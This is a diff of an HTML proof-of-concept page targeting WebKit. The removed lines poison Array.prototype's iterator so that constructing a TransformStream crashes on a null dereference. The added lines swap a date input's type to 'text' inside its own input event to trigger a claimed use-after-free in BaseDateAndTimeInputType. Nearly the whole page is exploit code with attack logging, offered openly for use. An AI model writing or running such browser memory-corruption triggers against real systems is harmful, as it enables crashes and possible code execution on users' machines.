@@ -3,50 +3,52 @@
 <head>
 <style>
 body { background:#000; color:#0f0; font-family:monospace; font-size:13px; padding:8px; }
-.info { color:#0ff; } .hit { color:#f0f; font-weight:bold; }
+.info { color:#0ff; } .hit { color:#f0f; font-weight:bold; } .warn { color:#ff0; }
 </style>
 </head>
 <body>
 <div id="log"></div>
+
+<!-- This is our victim element -->
+<input type="date" id="target">
+
 <script>
 function log(m,c){var d=document.createElement("div");d.className=c||'';d.textContent=m;document.getElementById("log").appendChild(d);}
 
-log("=== TRANSFORMSTREAM ITERATOR POISONING ===", "info");
-log("[*] Setting up the trap on Array.prototype[Symbol.iterator]...", "info");
+log("=== BASEDATEANDTIMEINPUTTYPE USE-AFTER-FREE ===", "info");
+log("[*] Setting up the trap on the input event...", "info");
 
-const originalIterator = Array.prototype[Symbol.iterator];
+let input = document.getElementById("target");
 
-// This poisons the array returned by createInternalTransformStreamFromTransformer
-Array.prototype[Symbol.iterator] = function*() {
-    log("[!] TRAP TRIGGERED! The C++ SequenceConverter is reading our array!", "hit");
+// When the C++ code calls InputType::setValue, it dispatches the 'input' event.
+// We catch it here.
+input.addEventListener("input", () => {
+    log("[!] INPUT EVENT FIRED! The C++ code is currently paused...", "warn");
+    log("[!] Changing input type to 'text'. This destroys the Date input object in C++!", "hit");
     
-    // Slot 0: transform (C++ accepts JSValue, anything is fine)
-    yield {}; 
+    // Changing the type replaces the BaseDateAndTimeInputType instance 
+    // with a TextFieldInputType instance. The old C++ object is DELETED.
+    input.type = "text";
     
-    // Slot 1: readable (C++ does jsDynamicCast<JSReadableStream*>(val)->wrapped())
-    // Passing a fake object makes jsDynamicCast return nullptr.
-    // nullptr->wrapped() -> INSTANT SEGFAULT.
-    yield { fake: "I am not a JSReadableStream" }; 
-    
-    // Slot 2: writable (C++ does jsDynamicCast<JSWritableStream*>(val)->wrapped())
-    yield { fake: "I am not a JSWritableStream" };
-};
+    log("[*] Returning to C++. The code will now execute on FREED memory!", "info");
+});
 
 setTimeout(() => {
+    log("[*] Triggering the vulnerability...", "info");
+    
+    // We need to simulate user interaction to reach didChangeValueFromControl()
+    // A simple value change or dispatching a synthetic event might be enough 
+    // depending on the exact WebKit event routing, but focus + execCommand or 
+    // stepUp/stepDown often hits the right internal paths.
     try {
-        log("[*] Calling new TransformStream(). Watch the process die...", "info");
-        
-        // This triggers the C++ path that fetches the JS builtin's array
-        // and converts it using SequenceConverter
-        new TransformStream();
-        
-        log("[-] If you see this, the browser survived. (Patched or no crash)", "info");
-    } catch (e) {
-        log("[-] Caught JS exception: " + e.message, "info");
-    } finally {
-        // Restore just in case
-        Array.prototype[Symbol.iterator] = originalIterator;
+        input.focus();
+        // Force the value to change as if the user typed it
+        input.stepUp(); 
+    } catch(e) {
+        log("[-] Error: " + e.message, "info");
     }
+    
+    log("[-] If you see this and the browser didn't crash, try clicking the date picker manually and changing a value.", "warn");
 }, 1000);
 </script>
 </body>
